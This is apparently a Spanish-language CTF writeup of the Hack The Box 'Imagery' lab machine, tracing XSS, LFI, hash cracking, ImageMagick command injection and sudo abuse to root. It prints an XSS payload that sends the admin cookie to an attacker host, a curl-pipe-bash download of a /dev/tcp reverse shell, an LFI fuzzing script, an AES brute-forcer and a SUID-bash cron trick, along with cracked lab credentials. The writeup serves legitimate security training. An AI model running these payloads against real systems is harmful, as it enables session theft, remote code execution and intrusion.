---
title: "Imagery"
date: 2026-02-10 19:00:00 +0100
categories: [writeups]
tags: [HTB, XSS, LFI, Hash, Privesc, Medium, Linux]
image:
  path: /assets/img/imagery.png
  alt: "Miniatura del post"
  w: 1200     # Ancho real de la imagen en px (recomendado)
  h: 630      # Alto real (ratio típico 1.91:1) — recomendado por Chirpy
---

# Imagery
En esta máquina trataremos principalmente los siguientes puntos. 

| Contenido |
|-----------|
|-XSS Injection via Report Bug |
|-Stealing administrator user session cookie via XSS |
|-LFI to obtain users Hashes |
|-Cracking Hashes |
|-Command Injection in ImageMagick (convert) to Gain System Access |
|-System Files Enumeration |
|-Cracking AES zip (pyAesCrypt) |
|-Abussing sudoers privilege via Charcol backup software (Privilege Escalation) |

Como siempre, lo primero que solemos hacer por cuestión de buenas prácticas, es crearnos nuestros directorios de trabajo que nos permitirán trabajar de forma organizada. Una vez estamos listos y tenemos conectividad con la máquina comenzamos enumerando el objetivo. Nos interesa en primer lugar ver qué puertos tiene abiertos. 

```bash
sudo nmap -p- --open -sS -vvv -n -Pn [IPObjetivo] -oG allPorts
sudo nmap -sC -sV -p[Puertos] [IPObjetivo] -oN targeted
```

![Captura de pantalla 1](/assets/img/imagery/5.jpg)

Ahora tenemos algo más de información. En cuanto a la versión de SSH, no parece vulnerable, por lo que tendremos que centrar nuestra atención en el puerto 8000. De hecho esto de "Werkzeug httpd 3.1.3 (Python 3.12.7)" es un servidor web ligero de desarrollo que forma parte de Werkzeug, una biblioteca base de Python que se usa mucho con Flask, un framework web minimalista. Normalmente este servidor, es para desarrollo y no debería emplearse nunca para producción, ya que no cuenta con medidas de seguridad ni rendimiento como Nginx por ejemplo. Dicho de otra forma, esto seguramente presente muchas vulnerabilidades.

Lo primero que vamos a hacer, es lanzar whatweb para ver las tecnologías que corren por detrás.

```bash
whatweb http://[IPObjetivo]:8000]
```
![Captura de pantalla 2](/assets/img/imagery/6.jpg)

Vemos un correo de contacto, información del servidor, la tecnologías empleadas, etc. Podemos ir haciéndonos ya una idea de lo que nos vamos a enfrentar. Ahora ya sí, vamos a echarle un vistazo al sitio web

```
http://[IPObjetivo]:8000
```
La web presenta varias secciones. Un portal de inicio, una sección de Login y una sección para crear una cuenta. Vamos a empezar creando una cuenta. 
Al acceder con nuestra cuenta, podemos subir una imagen. Pues vamos a hacerlo.

![Captura de pantalla 3](/assets/img/imagery/8.jpg)

En este punto, podemos y debemos ir ya probando cositas. Vemos también que con esta cuenta creada, hay algunas funcionalidades que están bloqueadas o no permitidas. Para ir al grano, en la parte inferior vemos una sección llamada "Report Bug"

![Captura de pantalla 4](/assets/img/imagery/10.jpg)

Si hay una sección para enviar Bug, quiero pensar que debe haber una cuenta de administrador que gestione esto por detrás, ya sea para revisarlo o confirmarlos. Puede estar interesante probar en este caso una inyección XSS. De hecho, al enviar algo, nos avisan de que el Admin lo va a revisar. Pues lo dicho, podemos tratar de probar un XSS, de manera que si se ejecuta nuestro JavaScript en el reporte de Bugs, es posible que obtengamos la cookie de sesión del administrador cuando abra el informe. Antes de esto, vamos a hacer una primera prueba para ver si al abrir el informe de Bugs el Admin, nos hace una petición a nuestro servidor local de Python. De hecho, algo que podemos comprobar para ver si puede o no ser vulnerable, es echarle un vistazo a HttpOnly. Si está en False, es un indicativo de qué podría llegar a ser vulnerable

![Captura de pantalla 5](/assets/img/imagery/11.jpg)

![Captura de pantalla 6](/assets/img/imagery/12.jpg)


Lo primero que vamos a hacer, es montarnos un servidor web con Python

```bash
python3 -m http.server 80
```
Ahora, vamos a enviar esta carga en el reporte de Bugs para ver si el Admin pincha y nos manda una petición

```
<script><img src="http://IPAtacante/XSS"></script>
```
Si revisamos nuestro servidor de Python, veremos que la IP 10.10.11.88, es decir, la máquina objetivo, ha intentado llegar a nuestro servidor y por lo tanto esto significa que es vulnerable a inyecciones XSS Stored.

![Captura de pantalla 7](/assets/img/imagery/13.jpg)

![Captura de pantalla 8](/assets/img/imagery/14.jpg)

Pues sabiendo que es vulnerable a Stored XSS, ahora podemos tratar de robar la cookie de sesión del Admin como anticipábamos,  de la siguiente manera

```
<img src=x onerror="fetch('http://IPAtacante/?cookie='+encodeURIComponent(document.cookie))">
```
![Captura de pantalla 9](/assets/img/imagery/15.jpg)

Si volvemos a nuestro servidor web de Python, y esperamos un poquito. Cuando el Administrador abra el informe de Bugs que le hemos enviado, lograremos robar su cookie de sesión y ahora podemos suplantar su identidad y ganar acceso a su panel

![Captura de pantalla 10](/assets/img/imagery/16.jpg)

Tenemos la cookie de Admin, por lo que si ahora vamos al propio navegador y cambiamos nuestra cookie por esta, deberíamos ganar acceso al panel del Admin recargando la página.

![Captura de pantalla 11](/assets/img/imagery/17.jpg)

![Captura de pantalla 12](/assets/img/imagery/18.jpg)

Revisando un poco las nuevas funcionalidades que nos da este panel, en la sección User Management, podemos descargar logs de un usuario dado. Si pinchamos sobre Download Log nos saldrá el siguiente mensaje

![Captura de pantalla 13](/assets/img/imagery/19.jpg)

Nos dice que no nos puede mostrar o descargar el archivo de logs porque no se encuentra en el servidor. Si este endpoint está apuntando o apunta directamente a archivos del servidor, debemos pensar entonces en un posible LFI. Vamos a interceptar esto con Burpsuite y vamos a probar cositas.

Vamos a enviar la petición al Repeter y vamos a tratar de apuntar a un archivo local de la máquina

```
GET /admin/get_system_log?log_identifier=../../../../../../etc/passwd HTTP/1.1
```
![Captura de pantalla 14](/assets/img/imagery/22.jpg)

Efectivamente es vulnerable a LFI. Vamos a ver qué podemos enumerar y como podemos ganar acceso al sistema. Vemos que hay 3 usuarios: el usuario root, un usuario web y mark.


Algo que podemos enumerar es el archivo /proc/self/environ. Es un archivo virtual de Linux que contiene las variables de entorno del proceso actual. Es decir, son las variables de entorno del proceso que está ejecutando la aplicación web.

```
GET /admin/get_system_log?log_identifier=../../../../../../proc/self/environ HTTP/1.11
```
![Captura de pantalla 15](/assets/img/imagery/23.jpg)

Como vemos, nos da información importante para continuar con nuestra enumeración. El usuario que está corriendo el servicio es el usuario web desde un entorno virtual de Python /home/web/web/env/bin. Lo que vamos a hacer, es tratar de enumerar archivos existentes en esta ruta donde se lanza el aplicativo. Vamos a crearnos un pequeño diccionario con nombres de archivos comunes en aplicaciones web tipo Flask

```bash
nano files.txt
```
```
config.php
config.py
settings.py
app.py
run.py
wsgi.py
.env
README.md
index.html
.flaskenv
```
También vamos a montarnos un script en bash rápidamente, que va a ir Fuzzeando en el directorio /home/web/web, para comprobar si existe alguno de estos archivos.

```bash
touch fuzzing.sh
chmod +x fuzzing.sh
```
```bash
#!/bin/bash
COOKIE="session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aVBKBQ.1uIYmTnZdtPmeVQIj_tHRFwUVLk"

for file in $(cat files.txt); do
    RESPONSE=$(curl -s -b "$COOKIE" "http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../home/web/web/$file")

    if [[ ! $RESPONSE =~ "Error reading file" ]]; then
        echo "[+] Found: $file"
    fi
done
```
Ahora simplemente lo ejecutamos 

```bash
./fuzzing.sh
```
![Captura de pantalla 16](/assets/img/imagery/24.jpg)

Nuestro script nos reporta que existen los archivos config.py y app.py. Vamos a echarles un vistazo

```
GET /admin/get_system_log?log_identifier=../../../../../../home/web/web/config.py HTTP/1.11
```
![Captura de pantalla 15](/assets/img/imagery/25.jpg)

Vemos que en el archivo config.py, se hace referencia a un archivo db.json en el que se guardan datos. Vamos a echarle un vistazo

```
GET /admin/get_system_log?log_identifier=../../../../../../home/web/web/db.json HTTP/1.11
```
![Captura de pantalla 16](/assets/img/imagery/26.jpg)

Pues tenemos las contraseñas en formato MD5 seguramente para los usuarios admin y testuser.
```
"username": "admin@imagery.htb",
"password": "5d9c1d507a3f76af1e5c97a3ad1eaa31"
"username": "testuser@imagery.htb",
"password": "2c65c8d7bfbca32a3ed42596192384f6"
```
Lo primero que vamos a hacer, es comprobar que el hash, efectivamente es un MD5. Para ello, podemos utilizar hash-identifier

Sabiendo que ambos son MD5, podemos tirar de hashcat, john o CrackStation para romperlos fácilmente.

```bash
echo -e "5d9c1d507a3f76af1e5c97a3ad1eaa31\n2c65c8d7bfbca32a3ed42596192384f6" > hashes.txt
```
```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 --show hashes.txt
```
![Captura de pantalla 17](/assets/img/imagery/30.jpg)

Si queremos hacerlo con john podemos utilizar este comando. Igualmente solo nos pillará la contraseña para el usuario testuser.

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=Raw-MD5 hashes.txt
```
Por último podemos hacerlo con CrackStation si queremos

```
https://crackstation.net/
```
Al iniciar sesión con esta cuenta de usuario, en principio no parece que veamos nada nuevo o interesante. Es prácticamente las mismas funcionalidades que veíamos cuando creamos una cuenta nosotros mismos. Salvo por una peculiaridad. Ahora si probamos a subir una imagen, podemos editarla. Si por ejemplo la damos a Transform Image, podemos editar la imagen en muchos aspectos. Si este aplicativo corre a nivel de sistema, puede ser que alguno de estos parámetros sea vulnerable a inyección de comandos. En este punto vamos a necesitar de Burpsuite para capturar esta petición y ver si podemos inyectar comandos. Dado que tenemos también LFI, podríamos tratar de buscar información sobre como se procesa este software de edición o lo que sea.

Tratando de buscar pistas sobre algún aplicativo que pueda estar realizando estas acciones, descubrimos que se está empleando la herramienta convert desde la ruta /usr/bin/convert

![Captura de pantalla 18](/assets/img/imagery/38.jpeg)

Vamos a editar el tamaño de la imagen y capturar la petición con Burpsuite para tratar de inyectar comandos en alguno de los siguientes campos. Enviamos la petición al Repeter y vamos a ir probando. Si probamos a meterle una comilla al parámetro "x" vamos a ver lo siguiente 

```
"x":"'id",
```
![Captura de pantalla 19](/assets/img/imagery/35.jpeg)

Al meterle una comilla, el servidor responde con un error. Esto indica que la entrada se está ejecutando en un interprete de comandos /bin/sh. Con esto, podemos concatenarle un comando empleando ; o && de la siguiente manera. Al probar con ; y && vemos que se sigue aconteciendo el mismo error. Esto es debido a que rompen la sintaxis. Para solucionar esto, podemos utilizar lo que se conoce como "Command Substitution". Podemos utilizar alguno de los siguientes

```
`comando`
$(comando)
```
```
"x":"1 $(id)",
```
![Captura de pantalla 20](/assets/img/imagery/36.jpeg)

Como vemos, se ha ejecutado nuestro comando id, tenemos RCE. Ahora lo suyo, es obviamente ganar acceso al sistema. Para ello, podemos hacer como lo hacemos siempre. Vamos a crearnos un archivo index.html con el siguiente contenido

```
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/IPAtacante/443 0>&1'
```
Ahora nos montamos un servidor web con Python por el puerto 80 y nos ponemos en escucha por netcat para recibir la Shell 

```bash
nc -nlvp 443
```
Por último, en Burpsuite, vamos a lanzar un comando que lea nuestro index.html y lo pipeamos con Bash para que se ejecute.

```
"x":"1 $(curl http://IPAtacante/index.html|bash)",
```
![Captura de pantalla 21](/assets/img/imagery/37.jpeg)

Por arriba se tramita la petición por curl a nuestro archivo malicioso de Reverse Shell, y por abajo ganamos acceso al sistema

Como siempre, hacemos un pequeño tratamiento de la TTY 

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
```
Con esto podemos hacer CTRL + C sin perder la Shell. Para limpiar la pantalla con CTRL + L ejecutamos la siguiente instrucción 

```bash
echo $TERM
export TERM=xterm
```
Por último, ajustamos las proporciones a nuestro equipo 

```bash
stty size
stty rows 44 columns 183
```
Listando el contenido del directorio de trabajo actual (/home/web/web) encontramos los siguientes archivos. Procedemos a revisarlos en busca de configuraciones o credenciales y encontramos lo siguiente en el archivo /bot/admin.py

![Captura de pantalla 22](/assets/img/imagery/40.jpg)

Tenemos la contraseña en texto claro para el administrador del sitio web. Nos la guardamos por si la necesitaramos más adelante 

```
Usuario: admin@imagery.htb
Contraseña: strongsandofbeach
```
De resto, dado que hay muchos archivos, podemos filtrar primero por directorios que puedan parecernos interesantes de revisar, y si no encontramos nada útil, filtrar por archivos que contengan claves privada, contraseñas, o extensiones sospechosas.

```bash
find /home /var /opt /srv /tmp -type d "(" -iname "*backup*" -o -iname "*config*" -o -iname "*secret*" -o -iname "*old*" ")" 2>/dev/null
find /home /var /opt /srv /tmp -type f "(" -iname "*id_rsa*" -o -iname "*.db" -o -iname "*.sql" -o -iname "*.key" -o -iname "*.pem" -o -iname "*.bak" -o -iname "*.conf" ")" 2>/dev/null
```

![Captura de pantalla 23](/assets/img/imagery/41.jpg)

Encontramos dos directorios /var/backup y var/backups que parece interesantes de revisar. En el directorio /var/backup vemos un archivo "web_20250806_120723.zip.aes". Vamos a pasarlo a nuestro equipo y vamos a analizar mejor qué es esto

Nos montamos un servidor web con Python en la máquina objetivo por el puerto 1234 por ejemplo y en nuestra máquina de atacantes, vamos a descargarlo

```bash
python3 -m http.server 1234
```

```bash
wget http://10.10.11.88:1234/web_20250806_120723.zip.aes
file web_20250806_120723.zip.aes
```
![Captura de pantalla 24](/assets/img/imagery/42.jpg)

Si le hacemos un file para ver ante lo que estamos, veremos que es un archivo cifrado con AES, creado por pyAesCrypt. Se trata de un archivo .zip cifrado, por lo que tendremos que encontrar la contraseña. Para descifrar el archivo, podemos emplear la herramienta pyAesCrypt, que si no la tenemos instalada, podemos hacerlo con los siguientes comandos. En este caso nos montaremos un entorno virtual de Python para ejecutarla desde ahí.

```bash
cd content/
python3 -m venv venv
source venv/bin/activate
pip install pyAesCrypt
# Para desactivar el entorno, empleamos este comando 
deactivate
```
Si queremos instalarla directamente sin entorno virtual, podemos emplear este comando

```bash
pip3 install pyaescrypt --break-system-packages
```
Una vez tengamos la herramienta instalada, podemos lanzarla con el siguiente comando, pero nos pedirá una contraseña que no tenemos.

```bash
pyAesCrypt -d web_20250806_120723.zip.aes -o web.zip
```
Tras tratar de buscar la contraseña en el sistema objetivo y probar diferentes contraseñas por si se estaba reutilizando alguna de ellas, no conseguimos nada, por lo que recurrimos a crear un script en Python que aplique fuerza bruta y tratar de conseguirla así utilizando el rockyou.txt

Nos creamos un script rápido en Python con el siguiente contenido

```python
import pyAesCrypt
import sys
import os

BUFFER_SIZE = 256 * 1024
ENCRYPTED_FILE = "web_20250806_120723.zip.aes"
OUTPUT_FILE = "web.zip"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

def decrypt_file(password):
    try:
        pyAesCrypt.decryptFile(
            ENCRYPTED_FILE,
            OUTPUT_FILE,
            password,
            BUFFER_SIZE
        )
        return True
    except ValueError:
        # Password incorrecta
        if os.path.exists(OUTPUT_FILE):
            os.remove(OUTPUT_FILE)
        return False
    except Exception as e:
        print(f"\n[!] Error inesperado: {e}")
        sys.exit(1)

def main():
    try:
        with open(WORDLIST, "r", encoding="latin-1") as f:
            for count, line in enumerate(f, 1):
                password = line.strip()
                print(f"\r[*] Trying ({count}): {password}", end="")

                if decrypt_file(password):
                    print(f"\n\n[+] Password encontrada: {password}")
                    print(f"[+] Archivo descifrado: {OUTPUT_FILE}")
                    return

        print("\n\n[-] Password no encontrada")

    except KeyboardInterrupt:
        print("\n\n[!] Interrumpido por el usuario")
        sys.exit(0)

if __name__ == "__main__":
    main()
```
Al ejecutarlo, nos encuentra la contraseña y nos extrae el web.zip 

![Captura de pantalla 24](/assets/img/imagery/44.jpg)

```bash
unzip web.zip
```
Son los mismos archivos que veíamos en el directorio /home/web/web de la máquina. Pero si revisamos de nuevo el archivo db.json veremos algo diferente

![Captura de pantalla 25](/assets/img/imagery/46.jpg)

Ahora vemos las contraseñas en formato MD5 para los usuarios mark y web (que son usuarios del sistema). Pues vamos a guardarnos estos hashes y con hashcat, john o CrackStation vamos a romperlos

```
Usuario: mark
Hash: 01c3d2e5bdaf6134cec0a367cf53e535
Usuario: web
Hash: 84e3c804cf1fa14306f26f9f3da177e0
```
Como ya tenemos un archivo hashes.txt, vamos a añadir estos dos nuevos al archivo original.

```bash
cat << EOF >> hashes.txt
01c3d2e5bdaf6134cec0a367cf53e535
84e3c804cf1fa14306f26f9f3da177e0
EOF
```
Ahora vamos a probar a romperlos con hashcat 

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 --show hashes.txt
```

![Captura de pantalla 26](/assets/img/imagery/48.jpg)

Como vemos, hashcat consigue crackear la contraseña para el usuario mark, pero no para el usuario web. Si probamos con CrackStation, vemos que si logramos romper la contraseña de este usuario.

![Captura de pantalla 27](/assets/img/imagery/49.jpg)

```
Usuario: mark
Contraseña: supersmash
Usuario: web
Contraseña: spiderweb1234
```
Pues vamos a volver al equipo para convertirnos en el usuario mark. Ya como el usuario mark, podemos ir a su directorio personal y ver la flag de user.txt

```bash
find / -type f -name user.txt 2>/dev/null
cat $(find / -type f -name user.txt 2>/dev/null)
```
Si listamos los permisos de sudo para el usuario mark, veremos que puede ejecutar /usr/local/bin/charcol con permisos de root. No sabemos realmente qué es lo que hace este binario, pero vamos a averiguarlo

```bash
sudo /usr/local/bin/charcol help
```
En principio, parece ser el programa o binario con el que se ha creado el archivo cifrado con AES que nos sirvió para conseguir los Hashes de los usuarios mark y web.

![Captura de pantalla 28](/assets/img/imagery/52.jpg)

Vemos que hay una serie de parámetros. Uno de ellos bastante interesante y es que podemos lanzar una shell, que al hacerlo como sudo, estaremos en realidad como root. También vemos una opción para restablecer la contraseña. Si lanzamos directamente una shell, nos pedirá una contraseña que no tenemos, por lo tanto, vamos primero a restablecer la contraseña

```bash
sudo /usr/local/bin/charcol -R
```
Si volvemos a lanzar el binario con la opción de shell nos pedirá que configuremos una contraseña. Podemos ponerle alguna o establecer ninguna pulsando ENTER.Si ahora lanzamos charcol con el parámetro shell de nuevo, ahora no nos pide contraseña, y veremos que entramos en una consola interactiva y lo que hagamos, se estará ejecutando como root.

```bash
sudo /usr/local/bin/charcol shell
```
![Captura de pantalla 29](/assets/img/imagery/55.jpg)

Ya en esta shell de charcol, vamos a ver información de la herramienta para ver qué podemos hacer. Revisando la documentación nos fijamos en estas líneas

```
Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
```

Pues básicamente nos están diciendo cómo elevar nuestros privilegios. auto add se emplea para crear los cron jobs y podemos pasarle un comando (el que queramos), que no será validado. Por lo tanto, lo que ejecutemos en esta shell, será validado y ejecutado como root. Pues vamos a darle el privilegio SUID a la Bash y elevar nuestros privilegios.

```
auto add --schedule "* * * * *" --command "/bin/chmod u+s /bin/bash" --name "rootbash"
```

![Captura de pantalla 30](/assets/img/imagery/56.jpg)

Pues hemos añadido este comando para que se ejecute como un Cron job, por lo tanto, cuando se ejecute, deberíamos ver en /bin/bash el bit SUID activo.

```bash
ls -la /bin/bash
```
![Captura de pantalla 31](/assets/img/imagery/57.jpg)

En un minuto o así, la tarea cron se ejecutará y podremos lanzarnos un bash con su propietario que es root

```bash
/bin/bash -p
```
![Captura de pantalla 32](/assets/img/imagery/58.jpg)

Ya solo nos queda ir al directorio personal de root y visualizar la flag root.txt

```bash
cat /root/root.txt
```





